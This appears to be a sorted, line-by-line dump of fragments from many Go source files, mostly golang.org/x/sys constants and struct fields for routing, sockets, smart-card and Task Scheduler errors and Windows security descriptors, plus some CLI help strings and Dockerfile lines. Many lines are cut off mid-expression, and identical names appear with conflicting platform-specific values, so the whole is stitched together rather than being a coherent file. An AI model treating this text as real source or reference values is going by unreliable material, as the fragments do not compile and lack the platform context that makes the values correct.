RTNLGRP_IPV6_IFINFO   = 0xc
RTNLGRP_IPV6_MROUTE   = 0xa
RTNLGRP_IPV6_MROUTE_R = 0x1f
RTNLGRP_IPV6_NETCONF  = 0x19
RTNLGRP_IPV6_PREFIX   = 0x12
RTNLGRP_IPV6_ROUTE    = 0xb
RTNLGRP_IPV6_RULE     = 0x13
RTNLGRP_LINK          = 0x1
RTNLGRP_MDB           = 0x1a
RTNLGRP_MPLS_NETCONF  = 0x1d
RTNLGRP_MPLS_ROUTE    = 0x1b
RTNLGRP_ND_USEROPT    = 0x14
RTNLGRP_NEIGH         = 0x3
RTNLGRP_NEXTHOP       = 0x20
RTNLGRP_NONE          = 0x0
RTNLGRP_NOP2          = 0xe
RTNLGRP_NOP4          = 0x11
RTNLGRP_NOTIFY        = 0x2
RTNLGRP_NSID          = 0x1c
RTNLGRP_PHONET_IFADDR = 0x15
RTNLGRP_PHONET_ROUTE  = 0x16
RTNLGRP_TC            = 0x4
RTN_ANYCAST        = 0x4
RTN_BLACKHOLE      = 0x6
RTN_BROADCAST      = 0x3
RTN_LOCAL          = 0x2
RTN_MAX                                     = 0xb
RTN_MULTICAST      = 0x5
RTN_NAT            = 0xa
RTN_PROHIBIT       = 0x8
RTN_THROW          = 0x9
RTN_UNICAST        = 0x1
RTN_UNREACHABLE    = 0x7
RTN_UNSPEC         = 0x0
RTN_XRESOLVE       = 0xb
RTPRIO
RTPROT
RTPROT_BABEL                                = 0x2a
RTPROT_BGP                                  = 0xba
RTPROT_BIRD                                 = 0xc
RTPROT_BOOT                                 = 0x3
RTPROT_DHCP                                 = 0x10
RTPROT_DNROUTED                             = 0xd
RTPROT_EIGRP                                = 0xc0
RTPROT_GATED                                = 0x8
RTPROT_ISIS                                 = 0xbb
RTPROT_KEEPALIVED                           = 0x12
RTPROT_KERNEL                               = 0x2
RTPROT_MROUTED                              = 0x11
RTPROT_MRT                                  = 0xa
RTPROT_NTK                                  = 0xf
RTPROT_OPENR                                = 0x63
RTPROT_OSPF                                 = 0xbc
RTPROT_RA                                   = 0x9
RTPROT_REDIRECT                             = 0x1
RTPROT_RIP                                  = 0xbd
RTPROT_STATIC                               = 0x4
RTPROT_UNSPEC                               = 0x0
RTPROT_XORP                                 = 0xe
RTPROT_ZEBRA                                = 0xb
RTSCTS)$/ 
RTTIME
RTV_EXPIRE                              = 0x4
RTV_EXPIRE                        = 0x4
RTV_EXPIRE                     = 0x4
RTV_EXPIRE                    = 0x4
RTV_HOPCOUNT                            = 0x2
RTV_HOPCOUNT                      = 0x2
RTV_HOPCOUNT                   = 0x2
RTV_HOPCOUNT                  = 0x2
RTV_IWCAPSEGS                     = 0x400
RTV_IWMAXSEGS                     = 0x200
RTV_MSL                           = 0x100
RTV_MTU                                 = 0x1
RTV_MTU                           = 0x1
RTV_MTU                        = 0x1
RTV_MTU                       = 0x1
RTV_RPIPE                               = 0x8
RTV_RPIPE                         = 0x8
RTV_RPIPE                      = 0x8
RTV_RPIPE                     = 0x8
RTV_RTT                                 = 0x40
RTV_RTT                           = 0x40
RTV_RTT                        = 0x40
RTV_RTT                       = 0x40
RTV_RTTVAR                              = 0x80
RTV_RTTVAR                        = 0x80
RTV_RTTVAR                     = 0x80
RTV_RTTVAR                    = 0x80
RTV_SPIPE                               = 0x10
RTV_SPIPE                         = 0x10
RTV_SPIPE                      = 0x10
RTV_SPIPE                     = 0x10
RTV_SSTHRESH                            = 0x20
RTV_SSTHRESH                      = 0x20
RTV_SSTHRESH                   = 0x20
RTV_SSTHRESH                  = 0x20
RTV_WEIGHT                     = 0x100
RT_ACCELERATOR  ResourceID = 9
RT_ALL_FIBS                    = -0x1
RT_ANICURSOR    ResourceID = 21
RT_ANIICON      ResourceID = 22
RT_AWARE                      = 0x1
RT_BITMAP       ResourceID = 2
RT_BLACKHOLE                   = 0x40
RT_CACHING_CONTEXT                = 0x1
RT_CACHING_CONTEXT             = 0x1
RT_CACHING_CONTEXT   = 0x1
RT_CLASS_DEFAULT                            = 0xfd
RT_CLASS_LOCAL                              = 0xff
RT_CLASS_MAIN                               = 0xfe
RT_CLASS_MAX                                = 0xff
RT_CLASS_UNSPEC                             = 0x0
RT_CURSOR       ResourceID = 1
RT_DEFAULT_FIB                 = 0x0
RT_DIALOG       ResourceID = 5
RT_DLGINCLUDE   ResourceID = 17
RT_FONT         ResourceID = 8
RT_FONTDIR      ResourceID = 7
RT_GROUP_CURSOR ResourceID = 12
RT_GROUP_ICON   ResourceID = 14
RT_HAS_GW                      = 0x80
RT_HAS_HEADER                  = 0x10
RT_HAS_HEADER_BIT              = 0x4
RT_HTML         ResourceID = 23
RT_ICON         ResourceID = 3
RT_L2_ME                       = 0x4
RT_L2_ME_BIT                   = 0x2
RT_LLE_CACHE                   = 0x100
RT_MANIFEST     ResourceID = 24
RT_MAY_LOOP                    = 0x8
RT_MAY_LOOP_BIT                = 0x3
RT_MENU         ResourceID = 4
RT_MESSAGETABLE ResourceID = 11
RT_NORTREF                        = 0x2
RT_NORTREF                     = 0x2
RT_NORTREF           = 0x2
RT_PLUGPLAY     ResourceID = 19
RT_RCDATA       ResourceID = 10
RT_REJECT                      = 0x20
RT_SCOPE_HOST      = 0xfe
RT_SCOPE_LINK      = 0xfd
RT_SCOPE_NOWHERE   = 0xff
RT_SCOPE_SITE      = 0xc8
RT_SCOPE_UNIVERSE  = 0x0
RT_STRING       ResourceID = 6
RT_TABLEID_BITS                   = 0x8
RT_TABLEID_MASK                   = 0xff
RT_TABLEID_MAX                    = 0xff
RT_TABLE_COMPAT    = 0xfc
RT_TABLE_DEFAULT   = 0xfd
RT_TABLE_LOCAL     = 0xff
RT_TABLE_MAIN      = 0xfe
RT_TABLE_MAX       = 0xffffffff
RT_TABLE_UNSPEC    = 0x0
RT_VERSION      ResourceID = 16
RT_VXD          ResourceID = 20
RUN cd /riscv-go 
RUN cd /riscv-go/src 
RUN git clone https://review.gerrithub.io/riscv/riscv-go /riscv-go
RUN go build
RUN go build -a std
RUNTIME_FUNCTION) (ret bool) = ntdll.RtlDeleteFunctionTable
RUNTIME_FUNCTION) (ret bool) {
RUSAGE_(SELF
RUSAGE_CHILDREN                             = -0x1
RUSAGE_CHILDREN                         = -0x1
RUSAGE_CHILDREN                   = -0x1
RUSAGE_CHILDREN                 = -0x1
RUSAGE_CHILDREN                = -0x1
RUSAGE_CHILDREN               = -0x1
RUSAGE_SELF                                 = 0x0
RUSAGE_SELF                             = 0x0
RUSAGE_SELF                       = 0x0
RUSAGE_SELF                     = 0x0 // RUSAGE_THREAD unsupported on z/OS
RUSAGE_SELF                    = 0x0
RUSAGE_SELF                   = 0x0
RUSAGE_THREAD                               = 0x1
RUSAGE_THREAD                     = 0x1
RUSAGE_THREAD                  = 0x1
RUSAGE_THREAD                 = 0x1
RWF_/ 
RWF_APPEND                                  = 0x10
RWF_DSYNC                                   = 0x2
RWF_HIPRI                                   = 0x1
RWF_NOWAIT                                  = 0x8
RWF_SUPPORTED                               = 0x1f
RWF_SYNC                                    = 0x4
RWF_WRITE_LIFE_NOT_SET                      = 0x0
R_OK = 0x4
R_cpsr uint32
R_lr   uint32
R_pc   uint32
R_sp   uint32
Ra  uint64
Raw  [64]uint8
RawFileDedupeRange)(unsafe.Pointer(
RawFileDedupeRangeInfo)(unsafe.Pointer(
RawSockaddrCAN)(unsafe.Pointer(rsa))
RawSockaddrCtl)(unsafe.Pointer(rsa))
RawSockaddrDatalink)(unsafe.Pointer(rsa))
RawSockaddrIUCV)(unsafe.Pointer(rsa))
RawSockaddrInet4)(
RawSockaddrInet4)(unsafe.Pointer(
RawSockaddrInet4)(unsafe.Pointer(addr.Sockaddr)).Addr[:]
RawSockaddrInet4)(unsafe.Pointer(rsa))
RawSockaddrInet6)(unsafe.Pointer(
RawSockaddrInet6)(unsafe.Pointer(addr.Sockaddr)).Addr[:]
RawSockaddrInet6)(unsafe.Pointer(rsa))
RawSockaddrL2)(unsafe.Pointer(rsa))
RawSockaddrL2TPIP)(unsafe.Pointer(rsa))
RawSockaddrL2TPIP6)(unsafe.Pointer(rsa))
RawSockaddrLinklayer)(unsafe.Pointer(rsa))
RawSockaddrNFC)(unsafe.Pointer(rsa))
RawSockaddrNFCLLCP) SetServiceNameLen(length int) {
RawSockaddrNFCLLCP)(unsafe.Pointer(rsa))
RawSockaddrNetlink)(unsafe.Pointer(rsa))
RawSockaddrPPPoX)(unsafe.Pointer(rsa))
RawSockaddrRFCOMM)(unsafe.Pointer(rsa))
RawSockaddrTIPC)(unsafe.Pointer(rsa))
RawSockaddrUnix)(unsafe.Pointer(rsa))
RawSockaddrVM)(unsafe.Pointer(rsa))
RawSockaddrXDP)(unsafe.Pointer(rsa))
RawSyscall(SB)
RawSyscall6(SB)
Raw_size uint32
Rax      uint64
Rax    int64
Rbp      uint64
Rbp    int64
Rbx      uint64
Rbx    int64
Rcf    uint16
Rcv_mss        uint32
Rcv_rtt        uint32
Rcv_space      uint32
Rcv_ssthresh   uint32
Rcv_wnd             uint32
Rcv_wscale          uint8
Rcx      uint64
Rcx    int64
Rdev           int32
Rdev         uint32
Rdev       uint32
Rdev     uint32
Rdev     uint64
Rdev    int32
Rdev    uint32
Rdev    uint64
Rdev_major      uint32
Rdev_minor      uint32
Rdevice          uint16
Rdevice          uint32
Rdevice          uint64
Rdi      uint64
Rdi    int64
Rdomain      uint32
Rdx      uint64
Rdx    int64
ReadIntervalTimeout         uint32
ReadOperationCount           int64
ReadOperationCount  uint64
ReadTotalTimeoutConstant    uint32
ReadTotalTimeoutMultiplier  uint32
ReadTransferCount            int64
ReadTransferCount   uint64
Read_bytes                uint64
Read_char                 uint64
Read_format        uint64
Read_syscalls             uint64
RebootMsg    
Reclen       uint16
Reclen    uint16
Reclen  uint16
Reclen uint16
Recv    uint64
Recv uint32
Recv uint64
Recvpipe  uint64
Recvpipe uint32
Recvpipe uint64
Recvquota  uint8
Recvtiming uint32
RedirectionDllName               NTUnicodeString
Ref     int32
Ref  uint32
RefCount int32
Refcnt      uint32
Refcnt   uint32
Refcount int32
Reftim    Time_t
Reftim31  [4]byte
Reg) (err error) {
RegCloseKey(key Handle) (regerrno error) = advapi32.RegCloseKey
Regdump_len  uint32
RegionInfo struct {
RegionSize        uintptr
Regionindex uint32
Register-ArgumentCompleter -CommandName '%[1]s' -ScriptBlock {
RegisterEventSource(uncServerName 
RegisterFlagCompletionFunc()
RegisterServiceCtrlHandlerEx(serviceName 
Regs     [32]uint64
Regs   [16]uint64
Regs   [31]uint64
RelativeName        NTUnicodeString
Release    [65]byte
Release  [256]byte
Release  [257]byte
Release  [32]byte
ReleaseMutex(mutex Handle) (err error) = kernel32.ReleaseMutex
Remote []byte
RemoteMachineHandle Handle
Removal_status_flags uint32
RemoveDirectory(path 
Reordering     uint32
ReparseDataLength uint16
ReparseTag        uint32
Replace([]string) error
RequestedUsage               CertUsageMatch
RequstedIssuancePolicy       CertUsageMatch
Res_id       uint16
Reserve_kernel     int32
Reserve_pagedaemon int32
Reserved          uint16
Reserved         [4]int8
Reserved         [4]uint8
Reserved      uint32
Reserved     uint8
Reserved    [7]uint32
Reserved [10]uint64
Reserved [9]uint32
Reserved uint16
Reserved uint32
Reserved0         uint32
Reserved1         uint32
Reserved1  uint16
Reserved1  uint32
Reserved1 uint16
Reserved1 uint32
Reserved2      uint16
Reserved2    [12]byte
Reserved2  uint32
Reserved2 uint32
Reserved50     uint16
Reset []byte
ResetEvent(event Handle) (err error) = kernel32.ResetEvent
ResetPeriod  uint32
Resolve uint64
Response uint32
Restarts         uint32
Result    uint32
Result    uint64
Resvd    uint8
Resvd1 uint8
Resvd2 uint16
Retained for 
Retire_blk_tov   uint32
Retrans        uint32
Retransmits    uint8
Revents int16
Revents uint16
RevertToSelf() (err error) = advapi32.RevertToSelf
RevocationChecks                uint32
RevocationFreshnessTime      uint32
RevocationFreshnessTime    uint32
RevocationInfo    
RevocationOid    
RevocationResult uint32
Revoke(path string) (err error)
Rflags int64
Right  int16
Rights [2]uint64
Rip      uint64
Rip    int64
Rlimit) (err error)
Rlimit) (err error) = SYS_GETRLIMIT
Rlimit) (err error) = SYS_PRLIMIT64
Rlimit) (err error) = SYS_UGETRLIMIT
Rlimit) (err error) = getrlimit64
Rlimit) (err error) = setrlimit64
Rlimit) (err error) {
Rlimit) error {
Rmdir(path string) (err error)
Rmdir(path string) (err error) = SYS___RMDIR_A
Rmx       RtMetrics
Rmx      RtMetrics
Rmx     RtMetrics
Rmxgy9KzJVeS9/2gXHxylqXiyQDYRxCVz55jmeOWTM=
RootDirectory      Handle
Rootino      uint32
Route  [16]uint16
Row    uint16
Rows uint16 // ws_row: Number of rows (in cells)
Rsi      uint64
Rsi    int64
Rsp      uint64
Rsp    int64
RtlAddFunctionTable(functionTable 
RtlDefaultNpAcl(acl 
RtlDeleteFunctionTable(functionTable 
RtlDosPathNameToNtPathName(dosName 
RtlDosPathNameToRelativeNtPathName(dosName 
RtlGetCurrentPeb() (peb 
RtlInitString(
RtlInitString(destinationString 
RtlInitUnicodeString(
RtlInitUnicodeString(destinationString 
Rto                 uint32
Rto            uint32
Rtt            uint32
Rtt       uint64
Rtt      uint32
Rtt      uint64
Rttcur              uint32
Rttvar              uint32
Rttvar         uint32
Rttvar    uint64
Rttvar   uint32
Rttvar   uint64
Run 'hugo --help' for usage.
Run 'kubectl help' for usage.
Run func(cmd 
Run functions are executed in the following order:
Run lifecycle or ValidArgs
Run tests by running:
Run with no arguments to find potential vulnerabilities/misconfigurations which could allow privilege escalation. Add the 
Run with the 
Run: func(c 
Run: func(cmd 
RunE
RunE func(cmd 
RunE: func(cmd 
RunGet(args[0])
Running         uint64
Running an application with the '--version' flag will print the version to stdout using
Rusage
Rusage) (err error)
Rusage) (err error) {
Rx XDPRingOffset
RxID    uint32
Rx_dropped               uint64
Rx_fill_ring_empty_descs uint64
Rx_invalid_descs         uint64
Rx_ring_full             uint64
Rxbytes             uint64
Rxerr uint16
Rxhash    uint32
Rxoutoforderbytes   uint64
Rxpackets           uint64
S     TIPCSubscr
S0  uint64
S1  uint64
S10 uint64
S11 uint64
S2  uint64
S3  uint64
S4  uint64
S5  uint64
S6  uint64
S7  uint64
S8  uint64
S9  uint64
SACL_SECURITY_INFORMATION             = 0x00000008
SBRKP
SCARD_E_BAD_SEEK                                                          Handle        = 0x80100029
SCARD_E_CANCELLED                                                         Handle        = 0x80100002
SCARD_E_CANT_DISPOSE                                                      Handle        = 0x8010000E
SCARD_E_CARD_UNSUPPORTED                                                  Handle        = 0x8010001C
SCARD_E_CERTIFICATE_UNAVAILABLE                                           Handle        = 0x8010002D
SCARD_E_COMM_DATA_LOST                                                    Handle        = 0x8010002F
SCARD_E_DIR_NOT_FOUND                                                     Handle        = 0x80100023
SCARD_E_DUPLICATE_READER                                                  Handle        = 0x8010001B
SCARD_E_FILE_NOT_FOUND                                                    Handle        = 0x80100024
SCARD_E_ICC_CREATEORDER                                                   Handle        = 0x80100021
SCARD_E_ICC_INSTALLATION                                                  Handle        = 0x80100020
SCARD_E_INSUFFICIENT_BUFFER                                               Handle        = 0x80100008
SCARD_E_INVALID_ATR                                                       Handle        = 0x80100015
SCARD_E_INVALID_CHV                                                       Handle        = 0x8010002A
SCARD_E_INVALID_HANDLE                                                    Handle        = 0x80100003
SCARD_E_INVALID_PARAMETER                                                 Handle        = 0x80100004
SCARD_E_INVALID_TARGET                                                    Handle        = 0x80100005
SCARD_E_INVALID_VALUE                                                     Handle        = 0x80100011
SCARD_E_NOT_READY                                                         Handle        = 0x80100010
SCARD_E_NOT_TRANSACTED                                                    Handle        = 0x80100016
SCARD_E_NO_ACCESS                                                         Handle        = 0x80100027
SCARD_E_NO_DIR                                                            Handle        = 0x80100025
SCARD_E_NO_FILE                                                           Handle        = 0x80100026
SCARD_E_NO_KEY_CONTAINER                                                  Handle        = 0x80100030
SCARD_E_NO_MEMORY                                                         Handle        = 0x80100006
SCARD_E_NO_PIN_CACHE                                                      Handle        = 0x80100033
SCARD_E_NO_READERS_AVAILABLE                                              Handle        = 0x8010002E
SCARD_E_NO_SERVICE                                                        Handle        = 0x8010001D
SCARD_E_NO_SMARTCARD                                                      Handle        = 0x8010000C
SCARD_E_NO_SUCH_CERTIFICATE                                               Handle        = 0x8010002C
SCARD_E_PCI_TOO_SMALL                                                     Handle        = 0x80100019
SCARD_E_PIN_CACHE_EXPIRED                                                 Handle        = 0x80100032
SCARD_E_PROTO_MISMATCH                                                    Handle        = 0x8010000F
SCARD_E_READER_UNAVAILABLE                                                Handle        = 0x80100017
SCARD_E_READER_UNSUPPORTED                                                Handle        = 0x8010001A
SCARD_E_READ_ONLY_CARD                                                    Handle        = 0x80100034
SCARD_E_SERVER_TOO_BUSY                                                   Handle        = 0x80100031
SCARD_E_SERVICE_STOPPED                                                   Handle        = 0x8010001E
SCARD_E_SHARING_VIOLATION                                                 Handle        = 0x8010000B
SCARD_E_SYSTEM_CANCELLED                                                  Handle        = 0x80100012
SCARD_E_TIMEOUT                                                           Handle        = 0x8010000A
SCARD_E_UNEXPECTED                                                        Handle        = 0x8010001F
SCARD_E_UNKNOWN_CARD                                                      Handle        = 0x8010000D
SCARD_E_UNKNOWN_READER                                                    Handle        = 0x80100009
SCARD_E_UNKNOWN_RES_MNG                                                   Handle        = 0x8010002B
SCARD_E_UNSUPPORTED_FEATURE                                               Handle        = 0x80100022
SCARD_E_WRITE_TOO_MANY                                                    Handle        = 0x80100028
SCARD_F_COMM_ERROR                                                        Handle        = 0x80100013
SCARD_F_INTERNAL_ERROR                                                    Handle        = 0x80100001
SCARD_F_UNKNOWN_ERROR                                                     Handle        = 0x80100014
SCARD_F_WAITED_TOO_LONG                                                   Handle        = 0x80100007
SCARD_P_SHUTDOWN                                                          Handle        = 0x80100018
SCARD_S_SUCCESS                                                                         = S_OK
SCARD_W_CACHE_ITEM_NOT_FOUND                                              Handle        = 0x80100070
SCARD_W_CACHE_ITEM_STALE                                                  Handle        = 0x80100071
SCARD_W_CACHE_ITEM_TOO_BIG                                                Handle        = 0x80100072
SCARD_W_CANCELLED_BY_USER                                                 Handle        = 0x8010006E
SCARD_W_CARD_NOT_AUTHENTICATED                                            Handle        = 0x8010006F
SCARD_W_CHV_BLOCKED                                                       Handle        = 0x8010006C
SCARD_W_EOF                                                               Handle        = 0x8010006D
SCARD_W_REMOVED_CARD                                                      Handle        = 0x80100069
SCARD_W_RESET_CARD                                                        Handle        = 0x80100068
SCARD_W_SECURITY_VIOLATION                                                Handle        = 0x8010006A
SCARD_W_UNPOWERED_CARD                                                    Handle        = 0x80100067
SCARD_W_UNRESPONSIVE_CARD                                                 Handle        = 0x80100066
SCARD_W_UNSUPPORTED_CARD                                                  Handle        = 0x80100065
SCARD_W_WRONG_CHV                                                         Handle        = 0x8010006B
SCHED_E_ACCOUNT_DBASE_CORRUPT                                             Handle        = 0x80041311
SCHED_E_ACCOUNT_INFORMATION_NOT_SET                                       Handle        = 0x8004130F
SCHED_E_ACCOUNT_NAME_NOT_FOUND                                            Handle        = 0x80041310
SCHED_E_ALREADY_RUNNING                                                   Handle        = 0x8004131F
SCHED_E_CANNOT_OPEN_TASK                                                  Handle        = 0x8004130D
SCHED_E_DEPRECATED_FEATURE_USED                                           Handle        = 0x80041330
SCHED_E_INVALIDVALUE                                                      Handle        = 0x80041318
SCHED_E_INVALID_TASK                                                      Handle        = 0x8004130E
SCHED_E_INVALID_TASK_HASH                                                 Handle        = 0x80041321
SCHED_E_MALFORMEDXML                                                      Handle        = 0x8004131A
SCHED_E_MISSINGNODE                                                       Handle        = 0x80041319
SCHED_E_NAMESPACE                                                         Handle        = 0x80041317
SCHED_E_NO_SECURITY_SERVICES                                              Handle        = 0x80041312
SCHED_E_PAST_END_BOUNDARY                                                 Handle        = 0x8004131E
SCHED_E_SERVICE_NOT_AVAILABLE                                             Handle        = 0x80041322
SCHED_E_SERVICE_NOT_INSTALLED                                             Handle        = 0x8004130C
SCHED_E_SERVICE_NOT_LOCALSYSTEM                                           syscall.Errno = 6200
SCHED_E_SERVICE_NOT_RUNNING                                               Handle        = 0x80041315
SCHED_E_SERVICE_TOO_BUSY                                                  Handle        = 0x80041323
SCHED_E_START_ON_DEMAND                                                   Handle        = 0x80041328
SCHED_E_TASK_ATTEMPTED                                                    Handle        = 0x80041324
SCHED_E_TASK_DISABLED                                                     Handle        = 0x80041326
SCHED_E_TASK_NOT_READY                                                    Handle        = 0x8004130A
SCHED_E_TASK_NOT_RUNNING                                                  Handle        = 0x8004130B
SCHED_E_TASK_NOT_UBPM_COMPAT                                              Handle        = 0x80041329
SCHED_E_TASK_NOT_V1_COMPAT                                                Handle        = 0x80041327
SCHED_E_TOO_MANY_NODES                                                    Handle        = 0x8004131D
SCHED_E_TRIGGER_NOT_FOUND                                                 Handle        = 0x80041309
SCHED_E_UNEXPECTEDNODE                                                    Handle        = 0x80041316
SCHED_E_UNKNOWN_OBJECT_VERSION                                            Handle        = 0x80041313
SCHED_E_UNSUPPORTED_ACCOUNT_OPTION                                        Handle        = 0x80041314
SCHED_E_USER_NOT_LOGGED_ON                                                Handle        = 0x80041320
SCHED_S_BATCH_LOGON_PROBLEM                                               Handle        = 0x0004131C
SCHED_S_EVENT_TRIGGER                                                     Handle        = 0x00041308
SCHED_S_SOME_TRIGGERS_FAILED                                              Handle        = 0x0004131B
SCHED_S_TASK_DISABLED                                                     Handle        = 0x00041302
SCHED_S_TASK_HAS_NOT_RUN                                                  Handle        = 0x00041303
SCHED_S_TASK_NOT_SCHEDULED                                                Handle        = 0x00041305
SCHED_S_TASK_NO_MORE_RUNS                                                 Handle        = 0x00041304
SCHED_S_TASK_NO_VALID_TRIGGERS                                            Handle        = 0x00041307
SCHED_S_TASK_QUEUED                                                       Handle        = 0x00041325
SCHED_S_TASK_READY                                                        Handle        = 0x00041300
SCHED_S_TASK_RUNNING                                                      Handle        = 0x00041301
SCHED_S_TASK_TERMINATED                                                   Handle        = 0x00041306
SCM_BINTIME                    = 0x4
SCM_CREDENTIALS                             = 0x2
SCM_CREDS                               = 0x3
SCM_CREDS                         = 0x3
SCM_CREDS                         = 0x4
SCM_CREDS                      = 0x3
SCM_MONOTONIC                  = 0x6
SCM_REALTIME                   = 0x5
SCM_RIGHTS                                  = 0x1
SCM_RIGHTS                              = 0x1
SCM_RIGHTS                        = 0x1
SCM_RIGHTS                      = 0x01
SCM_RIGHTS                     = 0x1
SCM_RIGHTS                    = 0x1
SCM_RIGHTS                    = 0x1010
SCM_TIMESTAMP                               = 0x1d
SCM_TIMESTAMP                           = 0x2
SCM_TIMESTAMP                     = 0x2
SCM_TIMESTAMP                     = 0x4
SCM_TIMESTAMP                     = 0x8
SCM_TIMESTAMP                  = 0x2
SCM_TIMESTAMP                 = 0x1013
SCM_TIMESTAMPING                 = 0x23
SCM_TIMESTAMPING                 = 0x25
SCM_TIMESTAMPING_OPT_STATS       = 0x36
SCM_TIMESTAMPING_OPT_STATS       = 0x38
SCM_TIMESTAMPING_PKTINFO         = 0x3a
SCM_TIMESTAMPING_PKTINFO         = 0x3c
SCM_TIMESTAMPNS                  = 0x21
SCM_TIMESTAMPNS                  = 0x23
SCM_TIMESTAMP_MONOTONIC                 = 0x4
SCM_TIME_INFO                  = 0x7
SCM_TSTAMP_ACK   = 0x2
SCM_TSTAMP_SCHED = 0x1
SCM_TSTAMP_SND   = 0x0
SCM_TXTIME                       = 0x3d
SCM_TXTIME                       = 0x3f
SCM_UCRED                     = 0x1012
SCM_WIFI_STATUS                  = 0x25
SCM_WIFI_STATUS                  = 0x29
SCOPE_SECURITY_INFORMATION            = 0x00000040
SC_ACTION
SC_ACTION_NONE        = 0
SC_ACTION_REBOOT      = 2
SC_ACTION_RESTART     = 1
SC_ACTION_RUN_COMMAND = 3
SC_ENUM_PROCESS_INFO = 0
SC_EVENT_DATABASE_CHANGE = 0
SC_EVENT_PROPERTY_CHANGE = 1
SC_EVENT_STATUS_CHANGE   = 2
SC_LOG_FLUSH                                = 0x100000
SC_MANAGER_ALL_ACCESS         = 0xf003f
SC_MANAGER_CONNECT            = 1
SC_MANAGER_CREATE_SERVICE     = 2
SC_MANAGER_ENUMERATE_SERVICE  = 4
SC_MANAGER_LOCK               = 8
SC_MANAGER_MODIFY_BOOT_CONFIG = 32
SC_MANAGER_QUERY_LOCK_STATUS  = 16
SC_STATUS_PROCESS_INFO = 0
SDIAG_E_CANCELLED                                                         syscall.Errno = 0x803C0100
SDIAG_E_CANNOTRUN                                                         syscall.Errno = 0x803C0108
SDIAG_E_DISABLED                                                          syscall.Errno = 0x803C0106
SDIAG_E_MANAGEDHOST                                                       syscall.Errno = 0x803C0103
SDIAG_E_NOVERIFIER                                                        syscall.Errno = 0x803C0104
SDIAG_E_POWERSHELL                                                        syscall.Errno = 0x803C0102
SDIAG_E_RESOURCE                                                          syscall.Errno = 0x803C010A
SDIAG_E_ROOTCAUSE                                                         syscall.Errno = 0x803C010B
SDIAG_E_SCRIPT                                                            syscall.Errno = 0x803C0101
SDIAG_E_TRUST                                                             syscall.Errno = 0x803C0107
SDIAG_E_VERSION                                                           syscall.Errno = 0x803C0109
SDIAG_S_CANNOTRUN                                                         syscall.Errno = 0x003C0105
SEC)/ 
SECCOMP_MODE_/ 
SECCOMP_MODE_DISABLED                       = 0x0
SECCOMP_MODE_FILTER                         = 0x2
SECCOMP_MODE_STRICT                         = 0x1
SECRETMEM_MAGIC                             = 0x5345434d
SECURITY)
SECURITYFS_MAGIC                            = 0x73636673
SECURITY_ANONYMOUS      = SecurityAnonymous << 16
SECURITY_ANONYMOUS_LOGON_RID        = 0x7
SECURITY_AUTHENTICATED_USER_RID     = 0xb
SECURITY_BATCH_RID                  = 3
SECURITY_BUILTIN_DOMAIN_RID         = 32
SECURITY_CONTEXT_TRACKING = 0x40000
SECURITY_CREATOR_GROUP_RID          = 1
SECURITY_CREATOR_GROUP_SERVER_RID   = 0x3
SECURITY_CREATOR_OWNER_RID          = 0
SECURITY_CREATOR_OWNER_SERVER_RID   = 0x2
SECURITY_DELEGATION     = SecurityDelegation << 16
SECURITY_DESCRIPTOR
SECURITY_DESCRIPTOR {
SECURITY_DESCRIPTOR) (err error) = advapi32.SetKernelObjectSecurity
SECURITY_DESCRIPTOR) (err error) {
SECURITY_DESCRIPTOR) (isValid bool) = advapi32.IsValidSecurityDescriptor
SECURITY_DESCRIPTOR) (isValid bool) {
SECURITY_DESCRIPTOR) (len uint32) = advapi32.GetSecurityDescriptorLength
SECURITY_DESCRIPTOR) (len uint32) {
SECURITY_DESCRIPTOR) (ret error) = advapi32.BuildSecurityDescriptorW
SECURITY_DESCRIPTOR) (ret error) = advapi32.GetNamedSecurityInfoW
SECURITY_DESCRIPTOR) (ret error) = advapi32.GetSecurityInfo
SECURITY_DESCRIPTOR) (ret error) {
SECURITY_DESCRIPTOR) (sd 
SECURITY_DESCRIPTOR) DACL() (dacl 
SECURITY_DESCRIPTOR) Group() (group 
SECURITY_DESCRIPTOR) IsValid() bool {
SECURITY_DESCRIPTOR) Length() uint32 {
SECURITY_DESCRIPTOR) Owner() (owner 
SECURITY_DESCRIPTOR) SACL() (sacl 
SECURITY_DESCRIPTOR) SetDACL(dacl 
SECURITY_DESCRIPTOR) SetGroup(group 
SECURITY_DESCRIPTOR) SetOwner(owner 
SECURITY_DESCRIPTOR) SetRMControl(rmControl uint8) {
SECURITY_DESCRIPTOR) SetSACL(sacl 
SECURITY_DESCRIPTOR) String() string {
SECURITY_DESCRIPTOR) ToAbsolute() (absoluteSD 
SECURITY_DESCRIPTOR) ToSelfRelative() (selfRelativeSD 
SECURITY_DESCRIPTOR) copySelfRelativeSecurityDescriptor() 
SECURITY_DESCRIPTOR)(unsafe.Pointer(
SECURITY_DESCRIPTOR{}
SECURITY_DIALUP_RID                 = 1
SECURITY_DYNAMIC_TRACKING = 1
SECURITY_EFFECTIVE_ONLY   = 0x80000
SECURITY_ENTERPRISE_CONTROLLERS_RID = 0x9
SECURITY_FLAG_IGNORE_CERT_CN_INVALID   = 0x00001000
SECURITY_FLAG_IGNORE_CERT_DATE_INVALID = 0x00002000
SECURITY_FLAG_IGNORE_REVOCATION        = 0x00000080
SECURITY_FLAG_IGNORE_UNKNOWN_CA        = 0x00000100
SECURITY_FLAG_IGNORE_WRONG_USAGE       = 0x00000200
SECURITY_IDENTIFICATION = SecurityIdentification << 16
SECURITY_IMPERSONATION  = SecurityImpersonation << 16
SECURITY_INTERACTIVE_RID            = 4
SECURITY_LOCAL_RID                  = 0
SECURITY_LOCAL_SYSTEM_RID           = 18
SECURITY_LOGON_IDS_RID              = 5
SECURITY_LOGON_IDS_RID_COUNT        = 0x3
SECURITY_NETWORK_RID                = 2
SECURITY_NT_NON_UNIQUE_RID          = 0x15
SECURITY_NULL_RID                   = 0
SECURITY_PRINCIPAL_SELF_RID         = 10
SECURITY_PROXY_RID                  = 0x8
SECURITY_QUALITY_OF_SERVICE
SECURITY_RESTRICTED_CODE_RID        = 0xc
SECURITY_SERVER_LOGON_RID           = SECURITY_ENTERPRISE_CONTROLLERS_RID
SECURITY_SERVICE_RID                = 6
SECURITY_SQOS_PRESENT     = 0x100000
SECURITY_STATIC_TRACKING  = 0
SECURITY_VALID_SQOS_FLAGS = 0x1f0000
SECURITY_WORLD_RID                  = 0
SEC_E_ALGORITHM_MISMATCH                                                  Handle        = 0x80090331
SEC_E_APPLICATION_PROTOCOL_MISMATCH                                       Handle        = 0x80090367
SEC_E_BAD_BINDINGS                                                        Handle        = 0x80090346
SEC_E_BAD_PKGID                                                           Handle        = 0x80090316
SEC_E_BUFFER_TOO_SMALL                                                    Handle        = 0x80090321
SEC_E_CANNOT_INSTALL                                                      Handle        = 0x80090307
